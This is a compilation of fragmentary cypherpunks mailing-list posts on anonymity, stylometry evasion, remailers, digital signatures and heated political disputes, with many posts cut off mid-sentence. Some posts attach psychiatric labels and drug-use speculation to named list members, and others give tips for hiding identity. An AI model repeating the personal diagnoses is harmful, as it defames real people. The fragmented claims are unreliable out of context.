Much of our writing style is unconscious.  We habitually use certain vocabulary, sentence structure, punctuation.  Our writings are like a fingerprint.  The more we write, the greater the detail of that fingerprint.  We can try to alter the style.  Write shorter or longer sentences.  Choose our words capriciously.
But on some occasions (think ecommerce) it may be necessary to have a second party rewrite the original text.  Enter the "nym editor" to remove the stylometric clues from a nym's writings.  Correspondence between the nym owner and editor could be achieved anonymously using remailers, nym servers and "throw away" email accounts (Hotmail and Mailexcite).  When the nym owner locates an editor and they agree on the terms of engagement, the owner submits his text to the editor.  The editor reworks it, and sends it back to the owner.  The owner may then make a few small changes or even submit it to another nym editor before posting the text under his nym.  A nym owner may prefer a certain editor's style and continue to use him.  Thus the nym will offer stylometric clues of the editor, not the owner.
The nym owner can pay the editor using ecash, preferably of the fully-anonymous flavor.  If the nym owner stiffs the editor on a payment, he can then broadcast it through the relevant channels.  The nym suffers loss of reputation capital.  It seems reasonable to assume that the likelihood of fraud by the nym holder is slim, especially if the editor tends to deal with persistent nyms.
Fraud by the nym editor is also unlikely.  The worst he could do is publish the unedited text, giving stylometric clues about the nym holder.  The prudent nym holder who uses more than one editor can better avoid such a situation, though that risk is never entirely eliminated.  However if the nym editor is uncertain of the author of the text he is reworking, there is little incentive to blackmail the nym holder since all he may be doing is passing on stylometric clues about another nym editor.

But only as long as the nym holder remains anonymous.  Digital mixes are superb, but what good are they when we give away clues about who we are with every keystroke we embed in our digitally-signed messages?

Good point, but it's important to realize that these new attitudes are
only available to people who have access to the tools.  Much of the world
is still trapped in a dark age, without access to the light brought by
tools for communication.  Powerful interests seek to keep them that way.
Until that changes, the old mindset of us-against-them will continue to
be a threat to peace.
We as cypherpunks must be leaders in encouraging wider access to
communications and the tools which manage information.  It's not
right to target our message narrowly to the militias and racists
who gravitate towards anti-government causes.  We must be inclusive,
offering encouragement to other cultures, other races, other countries.
Anti-Japanese, anti-Jewish, anti-Black, anti-Arab sentiments will only
hinder our success, and likewise with our emphasis on violence, killing,
and death as solutions to problems.
The fact that other cultures are often repressive in their own right is
no excuse.  The tools we offer will help them become more open-minded
and inclusive.  But we must set an example ourselves.  It is a tragedy
that the message of hate is being propagated within a technological
movement which should foster openness and enlightenment.  We can do
better than this.

But that applied to non-citizens on US soil. IIRC, it removed the distinction between "good aliens" (i.e., those who had green cards) and
"bad aliens" where availability of services was concerned.
I don't think non-citizens who aren't on US soil have any particular
protection under US law. They can bring a lawsuit against the US or a US

I played around with Hotmail recently, and I didn't pick up any new cookies in my cookies file.  The only distinguishing information that Hotmail seems to collect (aside from the demographic info you feed them when you open an account) is the IP address you log in from.  A public proxy is sufficient to shield your IP address.  I created the account from one IP address and sent the email during a separate session from another IP address.  The X-Originating-IP header showed only the second address.  I don't know if Hotmail keeps track of all IP addresses that access each account.

Sometime ago during a discussion of ADD (Attention Deficit Disorder)
Bob told his story on the list.  He explained that he had had ADD, but
was now on amphetamines to counteract this, and was feeling much
better.  It was quite brave of him to discuss this openly.
I suspect what we are seeing is that the amphetamines are more than
counteracting his putative ADD problems, to the extent that he has
more energy than normal to write long winded Thompsonesque rants, the
content of which could be more clearly expressed in a treatise 1/10th
the size.
Impatience is a useful trait, because it causes one to reconsider the
efficiency of approaches.  Most of us simply don't have the patience
to even read the voluminous posts of Bob's to locate the actual

No offense to Bob, but I think his effectiveness would improve if he
let off the amphetamines a touch.

Actually, many studies have found that immigrants, legal and illegal,
make a net positive contribution to the economy, even considering their
access to government services.  Anyone who has worked with these people
knows that most of them work harder than native born Americans.
Even aside from the strictly economic balance sheets, giving these
people the opportunity to succeed in a free country is a significant
moral benefit which must count in favor of free immigration.
They also serve to make our country more multi-cultural, with
greater awareness and appreciation of the value of alternate customs
and lifestyles.  We develop "hybrid vigor", as our culture is cross
fertilized by elements from all around the world.  The result is an
incredibly dynamic and flexible culture, which is why the United States
will continue to be a world leader for the next century.
Of course, this gift of diversity causes immigrants to be hated and feared
by racists such as Tim May, who sees them only as targets to mock with
threats of murder:

The cypherpunks list has been well established as an outpost of hate

About a year ago, influential cypherpunk Tim May turned away from the
previous emphasis on cryptography and privacy, towards a new approach
emphasizing guns, violence, killing, exclusionary rhetoric, and crude
racist humor.  New members have become active who apparently find these

If this were really true, you would have posted your message under your real name (a.k.a., your persistent identity).  The fact that you chose to make your statement anonymously only proves the inverse of what you say.
We should remember that -- at least here in America and the rest of the so-called first world -- we live in the age of the sound bite where the "medium is the message."  Public opinion is manipulated by the puppetmasters who pull the emotional strings of John and Jane Q. Public sitting in front of the TV each night.  Witness how anyone who has watched a video on Waco is quickly being lumped into the category of an anti-government extremist (Terry Nichols had two copies of "Waco Under Siege" in his house).  The underlying message is, "don't consider any of the facts that the video viewer presents to you, just realize he/she is an extremist."
Frankly, I wasn't there at Waco so I don't know what happened.  However, as Monty pointed out in another post, the fact that the FBI/BATF/etc. administered the gas into the Davidian home (notice how I fail to use the media-sanctioned term "compound") is clearly an aggressive act on the part of the U.S. gov't.  Regardless of what the spinmeisters say (both on the left and the right) no human being with a conscience can take note of this fact and say that the feds were justified in their actions.  Gassing children?  Come on.
A single sound bite on its own will do nothing, but a persistent group of sound bites presented over time with a recurring message can create a great amount of influence.  This is how public opinion is formed through mass
media channels.
But think about this: who is the author of these mass media sound bites?  Can you name the person?
It's easy to say that it's the feds, the ZOG, the NWO crew...but you can't name an individual can you?  Why is that?
Seriously, think about this question.  It has a lot to do with a major
cypherpunk theme: anonymity.  But in this case, with hardly any conscious

@_subject: Traffic Analysis Tip #3207 
TRAFFIC ANALYSIS TIP  Seasonal Affective Disorder (SAD)
When performing traffic analysis and/or stylometry for the purpose of
discerning the sometimes subtle differences between genuine mental
imbalance and affectation of the same by boilerplate government and/or
corporate shills, one needs to take into account the possible role that
'Seasonal Affective Disorder,' (SAD), may play in emotive attacks on
the target, be it a group or a particular subject.
The onset of SAD can often be recognized by the correlation between
increasingly emotional attacks and specifically monitorable elements
of seasonal changes, such as the decreasing amount of light in the
northern and southern climes as winter advances.
Examples of this can be easily charted using posts originating from
ISP's such as sympatico.ca. The data can then be compared to that
garnered through an analysis of Hettinga's posts, showing that the latter are goal-oriented emotive attacks designed to provide identity-
associated confirmation/support of the current round of anonymous posts
aimed at denigrating the cypherpunks mailing list by associating it
directly, in the minds of others, with one or two individuals/targets
on the list.
Note that although SAD can aggravate existing conditions, such as OCD
(Obssesive-Compulsive Disorder), it does not change the basic traits
of those conditions.
The excessive diatribes of Choate, for instance, upon having a few
lines of one of his posts changed/misquoted by Toto/TruthMonger, were
shown by analysis to have been easily deflected by others into a more
generalized attack/defense-of-his-position.
While Hettinga's current attack might easily be confused with an
identity-fixation focus of the same general form of OCD, closer analysis would show that his posts continually return to goal-
oriented repetitive misstatements aimed toward linking the individual
to a specifically designed mind-construct being advanced by the
para//el anonymous posts.
Likewise, the effect of Seasonal Affective Disorder on those afflicted
with a wider variety of interconnected dysfuntionalities, such as the
ADHD/Tourette/OCD/Schizoid tendencies of TruthMonger  is to merely
increase the volatility of already existing conditions.
Analysis of the known posts of  under a variety of personas and
anonymous list offerings, shows the same wide set of dysfunctional anomalies working at cross-purposes on a broad spectrum of issues.
One of the keys to differentiating these posts from those produced
by boilerroom spook operations is recognizing the existence of multiple underlying signs of a broader range of diagnosic criterion
than is present in a willful affectation of dysfunctional conditions
designed to elicit para//el emotive reactions in other subscribers
to the mailing list.
The effect/influence of SAD has been shown in the past to be much
greater during high levels of El Nino activity.

"THE GREAT AWAKENING
"A conservative reaction against the world view of the new science was bound to follow, and the first half of the eighteenth century witnessed a number of religious revivals in both England and America.  They were sometimes desperate efforts to reassert the old values in the face of the new and, oddly enough, were themselves the direct product of the new cult of feeling, a philosophy which argued that man's greatest pleasure was derived from the good he did for others and that his sympathetic emotions (his joy as well as his tears) should not be contained."

A few more comments on World War II.
Had World War II been prevented, along with deaths of 50 million or so
people, we would also have been spared (in the United States) income
tax withholding.  Previously the only people paying income tax were
fairly wealthy and there was no withholding.
I doubt very much that income tax withholding would have been accepted
if the War were not used to justify it.  ("You don't want to pay
taxes?  What are you, a traitor?")
Without income tax withholding, it would have been hard to get to the
point where we are now.  The U.S. Federal government consumes about
40% of the GDP.  When the resources aren't wasted outright, they are
used to perpetrate evil in the world.
To put this in perspective, multiply your income by 1.4.  For example,
if your income is $50,000, that would be another $20,000 you would
have every single year.  Where could you spend that money?
If you simply saved it at 3% a year, in 30 years you would have about
$950,000.  That's all for doing exactly what you do now.  Who needs
national health insurance?

shadow agencies in order to find out the highest price they can
sell out or capitulate for without making it worth the spooks time

Your observation and my claim are actually not inconsistent if you

most governments as a good thing.
Let's expand the discussion to war.  If one considers it desirable to:
1. increase taxes,
2. to waste vast resources,
3. to kill large numbers of civilians indiscriminately or methodically,
4. to kill large numbers of conscripts,
5. to destroy the land,
6. to create millions of people who will live the rest of their lives
   in post combat nightmares,
7. to lay the seeds for future wars,
8. to create thousands, or even millions, of orphans,
9. to cause food shortages and disease,
10. and to traumatize human society,
then violence in the form of war is a good investment.  Not too many
people see this as desirable.

@_subject: Prevention of War 
It looks like some context was lost.  My comments on preventing war
were part of an ongoing discussion on the effect cypherpunkly tools
may have on wars.  So, the particular "methodology" I had in mind was
that the development of extensive cross border relationships would
make wars harder to prosecute.
Imagine that in 1938 Germany that half the relationships people had
happened to cross borders.  This would mean that it would have been
far easier for many people to simply flee Germany because they would
have more couches to sleep on abroad, more people who would maybe lend
money to make it possible, and more world wide sympathy for refugees.
Also, imagine that assets were easily moved around the world and that
the German government would have been unable to control this.  This
would have made it easier for refugees to simply move what assets they
had out of the country.  But, they would probably only commit a
portion of their assets to German control, anyway, which would mean no
movement would even be necessary.
The net result of Nazi policies would have been large numbers of
people fleeing and depriving Germany of their talents and
I do not just mean Jewish people.  Alex Le Heux mentioned that he felt
sorry for the conscripts in the Germany army who were forced to invade
other countries.  The reason people are conscripted is because they
would not otherwise volunteer.  If it was a relatively simple matter
to avoid military service, how many would fail to do so?  (And
remember that when half your friends do not have your nationality,
appeals to patriotism are less powerful.)
It is not clear that people in Germany who held substantial wealth
were all that sympathetic to Hitler.  Unfortunately, Hitler seemed to
provide a way for them to protect their wealth from other worse
people.  Later, they had to cooperate with the German government in
order to keep their wealth.  (See, for instance, the extensive
negotiations during the War to ensure that the oldest son of the Krupp
family would, in fact, inherit the firm.)
However, if the wealthy had their assets distributed through a number
of countries, this problem would have been mitigated.
The result of the policies of the German government would have been
simply to alienate and expatriate the most useful elements of German
society and deprive it of the ability to credibly wage war.
However, leaving cypherpunk issues aside, it is possible that the
necessity of World War II has been exaggerated.
The Japanese in 1941 were somewhat dependent on oil from the
Phillipines.  The last straw was when the U.S. embargoed this oil.
That may have been good policy, but it provoked the War.
Another little item which is usually given a strange spin is that
Britain and France declared war on Germany, not the other way around.
Perhaps that was good policy, but it is important to remember who
attacked whom.
There is a lot to be said for delaying the start of a war because
unexpected developments may later make a peace possible.
It's worth noting that Hitler's most evil activities didn't occur
until the war really got going in a big way.  This made it much harder
for people to question or even know the policies their government was
carrying out.  ("What are you, a traitor?")
Also, it is clear that the Allied governments had not entered the War
for altruistic reasons.  Few Jewish refugees were accepted during the
1930s even though they were clearly being mistreated and had every
reason to flee Germany.  Allied knowledge of the Holocaust was
*suppressed* expressly to avoid popular support for admitting
After the War the U.S. even smuggled large numbers of Nazis, including
many war criminals, out of Germany and into South America.
Any American who wanted to do the right thing for the human race
during World War II would have been wise to stay out of the Army and
spend time and effort just finding out what was going on.  A
relatively small number of people dedicated to exposing the Holocaust
would have done more good for the world than many thousands of
soldiers.  Ironically, these people would probably have had to outwit
both the American and German governments in finding the facts and
publicizing them.
The links between the two World Wars are strong.  Had World War I been
avoided - and it could have been - many of the issues I have discussed
regarding World War II would not even have occurred.
This was not a pretext for the war because it hadn't occurred yet!
The War itself made the Holocaust feasible.
Countries rarely invade other countries for altruistic reasons, but
they have be dressed up this way for popular consumption.
And let us note that this was not an elected position.  The other
countries (and people!) in the world did not get together and ask the
U.S. government to play this role.  Probably it's most accurate to
describe this as a propaganda technique to get American popular
support for policies designed to promote American hegemony.

Faceless Freedom on the Net
     by Theta Pavis      7:30am  25.Nov.97.PST
     NEWPORT BEACH, California - When a whole weekend is dedicated
     to exploring the principles of electronic anonymity, some big concepts
     about basic human freedoms get thrown around. And though he has
     spent a lot of time in the past couple of years providing tools that
     allow people to maintain their privacy while communicating in the
     wide-open spaces of online communications, Lance Cottrell has seen
     the more mundane realities of the anonymity issue.      A couple years back, Cottrell began distributing his Mixmaster
     anonymous remailer. The ability to tell the truth without announcing
     to the world, or reprisal-minded enemies, just who is speaking might
     be a cornerstone of digital freedom. But it also opens the door to those
     for whom anonymity is just a novel tool for pulling a nasty prank.      Cottrell, who created Mixmaster while working on his physics
     doctorate at the University of California, San Diego, said the pure
     novelty of anonymous tools made them attractive at first.      "People used them in abusive ways for the same reason people climb
     Mount Everest - because it's there," Cottrell said during a
     weekend-long conference here on the technical and philosophical
     underpinnings of electronic anonymity. The session, titled
     "Anonymous and Pseudonymous Communication on the Internet," was
     sponsored by the American Association for the Advancement of
     Science.      Cottrell, who describes himself as a "hard-line extremist in favor of
     anonymity," said the only real way to measure the problem is by
     looking at how many complaints there are about the use of software
     that protects a user's identity.      The pattern Cottrell has seen suggests that as use of anonymous
     remailers and the like increases, complaints about faceless harassment
     and other abuses have declined. His simple thesis for the dip:
     Anonymity tools are quickly becoming familiar, and users are
     becoming more responsible in their use.      Cottrell, who is also president of Infonex Internet Inc., owner of the
     popular Anonymizer email and Net access service, said that, given the
     deeper personal-freedom issues inherent in the anonymity issue, it's
     crucial that such services become profitable.      "There's only 15 or 20 of them [anonymous remailers] in the world, and
     they're all run by volunteers. Those volunteers are under a lot of
     pressure and are taking significant risks," he said.      Dealing with law enforcement requests for information comes with the
     territory, for instance. When confronted with such demands, Cottrell
     said, "We comply completely and give them everything we have -
     which is nothing. The FBI, so far, is content [to be given] log files with
     nothing useful in it."      Overseas, police have tried to get information a "handful" of times, he
     said. Austrian and German agents have come to Infonex to find out who
     is hosting a Web site that includes Nazi propaganda - a site run by
     Austrians but illegal in their home country.      But, Cottrell said, just as the people behind that site trust the company
     with their anonymity, so too can human rights organizations, which
     will increasingly be using anonymous remailers in the future.      "Groups of people will be putting their lives in our hands, very
     literally," Cottrell said.

Ugly's the word for it, alright. ;-)
It would be nifty if there was a way to show that any continuous set

Intuitively, it seems to me that this might be provably inconsistent
with a secure hash.  Still, crypto results are full of surprises, so I
could imagine there is a way to do this.
Good point.  It is nice that people who quote out of context now in a
misleading way are convicted when you demand proof.
Still, my sense is that this would be a pretty useful thing to be able
to do and it would be technically interesting.
For example, you might want to reveal parts of a message signed by

There is a widely held belief that cryptoanarchy is an all or nothing
proposition; that is, the future can be a glorious cryptoanarchy or a
dismal police state.  (I think this is Tim May's analysis, but perhaps
others also contributed.)
It isn't clear to me that these two environments cannot co-exist in a
stable equilibrium.  Historically, in many societies which practiced
slavery, large numbers of people were neither slaves nor slave owners.
Given the naivete of large portions of the population and certain
alarming technologies such as implants which are emerging, it seems
clear that large numbers of people will become little more than cattle
in the near future.  (Incidentally, I do not know that this will be
"Joe Sixpack" and his friends.  Many of those who are "success"
oriented are also most willing to be drug tested, the most reluctant
to question authority, and the least reluctant to be little more than
a cog in the machine.)
In any event, those who perceive their environment and respond
correctly may continue to be free while others will take the other
path.  It's tragic, of course, but perhaps not our problem.  Monty
Cantsin is willing to spend only so much time and effort encouraging
people to protect their privacy.
There's no reason why cypherpunks can't do business with the slavers.
That is, in exchange for various products requiring actual work,
cypherpunks (a.k.a. knowledge workers) can provide technical expertise
and other services.
Once it is clear that enslaving a cypherpunk is expensive, it may be
that the slavers of the world discover they can live with it and that
it may even be a good deal for them.
There might be some turmoil getting to that point, of course.  Many
U.S. citizens have been told they were free, although the ruling elite
tends to see them as chattle.  This difference of opinion will have to
be resolved one way or another.  Hopefully it will be done peacefully.
Perhaps instead of seeing ourselves as "The Sons of Liberty" we should
see ourselves as "The Sons of Tleilax".

So you can claim that anything you posted that later proves to be
too embarassing was "forged", right?  That's a lot easier to do if
you don't sign them with the PGP key which you keep advertising in
your bloated .sig, and you make sure they aren't archived by any
NEUTRAL third party.  (Remember when you called someone else [who
shall remain nameless at his request] a "coward" for hiding HIS
posts behind an "X-No-Archive" header?)
Many readers will remember that you were whining pitifully a few
months ago about how remailers were allegedly being used to "forge"
posts in your name.  You were given several suggestions, one of
which was to install PGP, generate a key, and use it to sign *ALL*
of your genuine posts.  Your huge .sig now contains the fingerprint
of a PGP public key that YOU ARE STILL NOT USING.  Still trying to
maintain "plausible deniability" for your posts?
And then a few weeks ago you butted into technical question posted
to alt.privacy.anon-server about Private Idaho with the implication
that the person asking the question wanted to know the answer so
that he/she could commit "forgery".  If you're so concerned about
forgery, why have you not bothered to try what was already suggested
the last time you launched into your "remailer users are abusive
assholes" tirade?
Then why did you demand that Jeff violate the privacy of all of his
users by turning over his user logs to you and Belinda Bryan
?  And when he said that the only condition
he'd release them was in response to a letter FROM YOUR LAWYER,
Belinda Bryan sent such a letter?
Perhaps the remailer users would like to know what purpose you had
in mind for demanding the e-mail addresses of EVERYONE who either
SENT or RECEIVED anonymous mail through Jeff's remailer.
It's your abuse that's not going to work anymore.  You've cried wolf
once too often about "abuse", "forgery", and other imagined
offenses.  The remailer operator did not "prove me wrong".  Reread
his post when you're sober:
  Just to refresh your memory, you were asked whether you had asked
Jeff Burchell to censor any anonymous posts that mentioned your
name.  You stonewalled the question, flippantly suggesting that
he/she ask the operator.  Someone did just that, and Jeff's post is
the result of that.  Looks like you gambled and lost that time!
You can call remailer users "liars" and "anonymous assholes" to your
heart's content, but your censorious actions and those of your
associates at DataBasix speak for themselves.

Mark Grimes: "Why do 39,440 people a month look up "Yahoo" on   Yahoo!? Maybe too many ate lead paint as children." A recent compilation of the 200 most popular keywords submitted to the Yahoo! Search engine offers some insights about the types of individuals that prowl the Web.
"Baywatch" babe Pam Anderson racked up 172,760 inquiries in a recent month to place 12th--two places behind "weather," 10 places ahead of "Microsoft," and 92 slots before "Bob Dole."   Janet Reno could fine Pamela an inch a day until she ranks equally
with Bob Dole, as a sex symbol. (3,000,000 places ahead of Reno.)
Good News:
"Metallica" (59) finished just ahead of "real estate" and "stock quotes"; at No. 82 "anal sex" was just before "cars" and "USA Today."
Bad News:
"Days of Our Lives" (91) came up more frequently than "marijuana" (93) and "Beatles" (111)."
The top 50: sex, chat, Playboy, Netscape software,
nude, porno, games, porn, weather, Penthouse,
Pamela Anderson, pornography, pussy, Persian Kitty,

@_subject: Digital Signatures 
You can't see it up here, but this is a signed message using a
protocol which is modestly titled "Cantsin Protocol No. 1".
Suggestions for improvement are most welcome.
At the bottom of this message you will find a series of hexadecimal
numbers expressed in ASCII which comprise the signature.  I considered
using ASCII armor or uuencode to store the information, but the
straight numbers are easier to work with.  That is, the components of
the signature are easily manipulated using off the shelf tools such as
Perl.  Also, because certain numbers are freely accessible, the
message is easy to filter without necessarily calling other programs.
It makes it easy to find signed messages using search engines which
are not necessarily aware of encryption protocol formats.
Having the numbers exposed has a nice feel.  It lets you see exactly
what is going on.  It encourages people to investigate the meaning of
the numbers and to think about the information a signature really
Cantsin Protocol No. 1 uses El Gamal to sign hashes generated by SHA1.
Executive summary of the signature format:
The first line is "16A5942B6EED349ECF4594C784DFD177 [Cantsin Protocol
No. 1]".  The hexadecimal number was chosen randomly and is the
indicator that this is a Cantsin Protocol No. 1 signature.  The number
was chosen randomly and it is somewhat unlikely that anybody else will
accidently choose it.  The text following the number is just there so
a human reading it will know what they are looking at.  No program
should rely on that text.
The signature begins where the code (i.e., "16A59...") begins - it
need not be preceded by a newline.  (It can be used to sign anything,
in other words.)
The public portion of an El Gamal key consists of three variables p,
g, and y.  p is a large prime, g is a randomly chosen number, and y is
computed using the secret key.  (See "Applied Cryptography" for the
details.  I'm using Schneier's nomenclature.)
Monty Cantsin's public authentication key is:
p: E0D087F3BA00B808E24606F13681AEAE702E2FD49F52DBBFB7B6C67606183FE42466FBB953858C3E618BED52E6EB15A0AFD4607AEA3B4D747A4A3A5D3CDDA0FB5DE59115ACCEC4E1F7A95D81814CF0CB0CA5F2342C809F92533CE1EEE96C352D6116A88B353881B594036C317A0EED2AE62FDEE4A7D8BBF077CCD8702268FD16FBDC7100A35BF9C02D187871B2F727D654174A73A72C2E24C9EA1826322779FDE2E21BF6DF99A895C379362FB45DF54CAE1CD3609DFCF3EC60E8C0513C87FF6EA46083CE1074491EDB63F804DCDCACAE3755739951D2FE22C57601DAD1742AE543209D107A32EAFE45976104190C759E1B50763EA3E3526FED3ED4F567DC00B9

(This key should not be used for communication.  It is not very well
secured.  Also, I like Adam Back's assertion that authentication keys
should be different from communications keys.)
The second line in the signature is an SHA1 hash of the public key.
The hash is computed on the concatenation of the hexadecimal ASCII
forms of p, g, and y respectively.  There should be no leading zeros.
(Remember to leave off the newline!)
The third line is an SHA1 hash of the message itself.
The fourth line contains an offset and a length to specify the area of
the text which is signed.  The offset is relative to the signature
itself.  That is, the first character of the Cantsin Protocol No. 1
code is at position 0.  As signatures are usually appended, the offset
will usually be the additive inverse of the length.
This is an unobtrusive and highly flexible signature format.  No text
is modified to accommodate the protocol.  No information needs to be
prepended to the text.  This means that signing a document only makes
it longer at the end - the area a reader cares the least about.  You
can sign as often as you like and it won't really matter that much.
This protocol could be used to sign The Declaration of Independence.
Not only that, but it is possible to be highly selective in what is
signed.  The user could sign a portion of a message without modifying
or sabotaging other signatures.  It is completely compatible with
other signature formats.  Not only can you sign the subset of text
which another user signed, but signatures can even overlap.
The last two lines are the signatures themselves.  El Gamal signatures
consist of two values which Schneier calls "a" and "b".
Note that the signature does not contain a time stamp!  Users who want
time stamps can add one in the text.
El Gamal is simple enough that the signature on this message can be
checked using standard Unix tools such as dc version 1.1.  Let's say M
is the SHA1 hash of the message.  It is checked by verifying the truth
of this equation: (y^a * a^b) mod p = g^M mod p.
(dc version 1.1 has an | operator which is used to compute equations
of the from a^b mod n like: a b n |.  The left side of the equation
will be easier to compute if you compute ((y^a mod p) * (a^b mod p))
mod p instead.)
You also need to be able to compute SHA1 hashes.  I've been using
something called "sha1file" which, I believe, originated at Adam
Back's web site.
I have some crude tools for making and verifying these signatures, but
they still need work.  At some point they will be released into the
public domain.
Aside from ordinary message signing, there are at least two good uses
for these signatures.
One is for timestamping services.  Since the signature is unobtrusive,
it would be easy to route a message to all known timestamping
services.  The timestamp can only fail if all timestamping services
fail.  Yet, the message would still be completely readable without any
garbage at the top.
Another is for authenticating messages from the distributed
cypherpunks mailing list machines.  Right now it would be somewhat
ugly to have all three machines signing every message.  But, with this
protocol it just makes each message a little longer.  This would
prevent certain kinds of attack and make it harder to exploit a
compromise of any of the mailing list machines.  (It's harder because
an undeniable trail of inconsistency is left even if the compromiser
has the power to sign messages at will.)

It is possible that Minsky is unaware of how ineffective these sorts

This is a cute line and I'm sure it was a hit with the crowd, but

I believe that many people are racists because they like to be that

The people who are working themselves up into a panic regarding "hate

Thanks to everybody for their interesting contributions to the partial
signature problem.
This approach looks like the best to me.  It's a bit cumbersome for
the person doing the quoting, but that's as it should be.
It's easy to see why we would want other people to sign with
signatures which enable partial quoting, but it's less clear why we
would sign our own messages this way.
For instance, somebody might want to quote my private e-mail out of
context where I say "Yes, I'm real glad I got rid of that guy.  He was
really a pest."  But they might not want to quote the part of the
message where I say "Thanks for the latest shipment of plastic
explosives."  In order to authenticate their claim they have to reveal
the entire message.  If they must quote the entire message for
authentication, it will discourage tacky behavior such as relaying
private messages.
So, this is sort of a solution looking for an application.  It seems
like an interesting problem and I have a strong intuitive sense that a
use for it will present itself at some point.

This model of "sheeple" doomed to slavery while cypherpunks comfortably
live independent of the state is even less plausible than the original
idea of crypto anarchy.  It appeals to our elitist instincts and makes

This idea overlooks the "fax effect", where the value of a technology
rises in proportion to the number of people who use it.  Cypherpunks will
have to set up a virtual Galt's Gulch, trading only with themselves,
and unlike in Rand's fantasy the limitations of such an economy will
soon be apparent.  Early cypherpunk experiments like "Magic Money"
showed how pointless a virtual cypherpunk bank would be.
Cypherpunk technologies create a protected boundary within which
transactions can be conducted free of third party surveillance and
tampering.  Only by extending this secure boundary to include the
masses will there be enough value generated within the secure region
to be worthwhile.  Cypherpunks who can only trade and work for each
other will not be able to generate sufficient economic growth to survive.
In an increasingly interdependent world economy, the only hope
for cypherpunk technologies to succeed is to extend them as far as
possible throughout society.  This includes reaching out to foreigners
and minorities, to the dismay of some cypherpunks.  We must oppose the
elitism and racism which some list members cling to, replacing it with

Although guns are obviously designed for killing things, this does not
mean that they will be used.  This can be seen from the statistics.
There are far fewer murders than there are guns.  Almost all of them
are never used for killing someone.
You are also not considering the case where one person has a gun and
another does not.  The situation is more stable if both people are
armed.  (And don't claim you are talking about disarming a whole
society.  You aren't, just part of it.)

isn't this a big political issue?  Could it be that the people pushing

Be aware that the gun control lobby has often used misleading

Given: We want more (reliable) remailers
       But someone has to pay for them
Conjecture: New remailers can be financed by charging the users a fee per
            message to use the remailers.
   If a remailer charges a fee, the number of users will be reduced to
   those who are willing to pay the fee.
   When the number of users is reduced, the potential for traffic analysis
   is increased, which reduces the value of the remailer.
   If the value of the remailer is reduced, it will not be worth the cost
   to many users, and those users will seek a less expensive, higher
   traffic remailer.
   Thus, the commercial remailer is forced to lower its prices until it is
   unprofitable.
Conclusion: Pay-per-message commecial remailers are not economically viable.
Hence we need a new economic model to finance remailers.
Several have been proposed:
 - Advertiser supported
 - Pay a flat fee per month for remailer access
 - Everyone a remailer.  Remailers only accept messages from other
   remailers.  To use remailers you must run a remailer.
 - Get companies to run remailers on their firewalls to reduce traffic
   analysis by competitors/spies
 - Pay for access to an anonymous message pool
 - Sell a spam filtering service to fund remailers
 - Sell a spamming service to fund remailers
 - Sell cpu cycles in exchange for remailer access
 - Charge people for extra services, such as low-latency
 - Pay for a nym account, nymserver subsidizes remailers
 - Have the money launderers subsidize the remailers
 - Somehow get all those Mac users to pay
 - Offer $50 to the first person to set up a remailer, as Monty Cantsin did
 - Fund social programs for universal remailer access and universal health

C2Net was wrong to censor the cypherpunks list in the guise of moderation.
It was wrong to send threatening letters to people who claimed its
products were weak.  The whole moderation/censorship experiment was a
terrible mistake.  The actions taken by C2Net were completely unjustified.
At the same time, it is dishonest to say that its products have
backdoors or are weak.  There is no evidence whatsoever that this
is the case.
It may stretch the intellects of some cypherpunks beyond the breaking
point to hold these two views about matters at the same time.  In the
black and white world where some cypherpunks live, a company which
tries to prevent criticism is evil, hence it must be fraudulent as well.
More mature list readers will recognize that a company or a person can
be wrong in some actions while being right in other ways.
The burden of proof in claiming that there is a weakness in someone's
security product is on those making the claim.  Compare the unfounded
statements by Vulis with the carefully documented breaks of weak
software by Ian Goldberg, David Wagner, John Kelsey, and Bruce Schneier.
What if Goldberg and Wagner had claimed that Netscape's RNG seeding was
weak, without providing any more evidence than that claim?  What if
Schneier et al had broken cellular phone encryption without backing it
up?  They would have been justifiably ignored.
If anyone really does believe that C2Net's products have backdoors or
weaknesses, why don't they present them?  Either they want people to keep
using C2Net's supposedly broken products, which reflects badly on them,
or they want people to stop but they are unable to present any evidence
of these purported weaknesses.
When Vulis or anyone else claims Stronghold is broken, ask him why he is
presenting his claims in a form which will cause people to keep using
this "broken" software.  Does he want people to have weak encryption?
Is he in favor of backdoors?  If not, he would surely present evidence
of the weaknesses, if there is any.  Make Vulis explain his motivations
when he makes these claims.

Oh yes, I can.  In fact, I believe the opposite is the case.  The

that this was wildly inaccurate.
You should come to the United States and spend some time around the

along with, and real careful with their weapons.
That can occur, but in general nobody likes to be shot.  Even if you

more cautiously.

Oddly enough, this is mostly true here as well.
It is unclear what is magical about the words "drive by shooting."  I
believe this phrase lacks real content and is simply a trigger for
The implication is that people are randomly firing on people in the
streets.  While this may occur once in a great while, it is extremely
uncommon.  Usually people kill for a reason.  Usually they are trying

black market.
Whether somebody kills their enemy from a car or not is irrelevant.

You don't have to.  You pay someone to bake your bread for you, and you can
pay someone to run your remailer for you.
This idea has been around since remailers began.  The basic premise is that
a group of remailers are set up which only accept mail from other remailers.
A pinging system can be set up to verify that all the remailers are
operating correctly.
The catch is that in practice each remailer is only required to accept mail
from other remailers, but can actually accept mail from anybody the operator
wants to.  So if you don't want to run a remailer, just pay someone to run a
remailer on your behalf, and then you can send anonymous messages through
that person's site.
Thus forwarding within the remailer network is free, but it costs money to
insert new messages.  This scheme is a little more flexible than attaching
ecash to each message because you can arrange any type of fee schedule you
like, such as a flat rate per month.
There's also the reverse of this, where remailers accept from anyone, but
only send to other remailers.  Thus you have to pay to get your messages
out of the remailer network.  This is more restrictive because the payment
must be anonymous.
Sign up with an ISP that offers alt.anonymous.messages.  This one is a
no-brainer. (and profitable for the ISP)
This results in a system where sending messages is essentially free (since
free remailers exist) but it costs money to receive them.  So far it seems
to be successful, at least for those who pay a flat fee for usenet access.

"The Secret War Against the Jews: How Western Espionage Betrayed the
Jewish People" by John Loftus and Mark Aarons.
Pages 49-50:
  "In 1943 the Holocaust was in full operation, but in April of that
year in Bermuda, a conference of British and American officials
formally decided that nothing should be done about it.  They 'ruled
out all plans for mass rescue.'  The British Foreign Office and the
U.S. State Department were both afraid that the Third Reich would be
quite willing, indeed eager, to stop the gas chambers, empty the
concentration camps, and let hundreds of thousands, if not millions,
of Jewish survivors emigrate to freedom in the West.  The Foreign
Office 'revealed in confidence' to the State Department its fear that
Hitler might permit a mass exodus.  If approaches to Germany to
release Jews were 'pressed too much that is exactly what might
  "The bigoted reality behind the Secret Report of the Easter 1943
Bermuda Conference was that not a single Allied nation wanted to let
teh Jews settle in its country.  The unspoken consensus was that it
was better to let Hitler handle them than arrange a mass evacuation to
the United States, England, or Canada.  In short, the Jews were
